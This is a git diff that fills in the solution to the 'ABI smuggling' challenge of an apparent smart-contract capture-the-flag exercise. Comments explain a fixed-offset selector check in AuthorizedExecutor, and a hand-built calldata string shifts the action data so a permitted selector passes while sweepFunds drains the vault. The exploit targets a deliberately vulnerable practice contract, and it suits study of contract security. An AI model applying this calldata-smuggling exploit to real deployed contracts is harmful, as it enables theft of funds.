@@ -44,7 +44,19 @@ describe('[Challenge] ABI smuggling', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // function execute in AuthorizedExecutor is vulnerable
+        // it uses fixed offset to find selector in calldata
+        // but we can move actionData in calldata forward by changing offset in the raw call
+        // and write the selector that is allowed to player to the right place in the raw call
+
+        // vaultInterface = vault.interface;
+        // sweepCallData = vaultInterface.encodeFunctionData("sweepFunds", [recovery.address, token.address]);
+        // withdrawCallData = vaultInterface.encodeFunctionData("withdraw", [token.address, recovery.address, 10n**18n]);
+        // console.log("sweep", vaultInterface.encodeFunctionData("execute", [vault.address, sweepCallData]));
+        // console.log("withdraw", vaultInterface.encodeFunctionData("execute", [vault.address, withdrawCallData]));
+        
+        smuggledSweep = "0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000";
+        await player.sendTransaction({to: vault.address, data: smuggledSweep, gasLimit: 100500});
     });
 
     after(async function () {
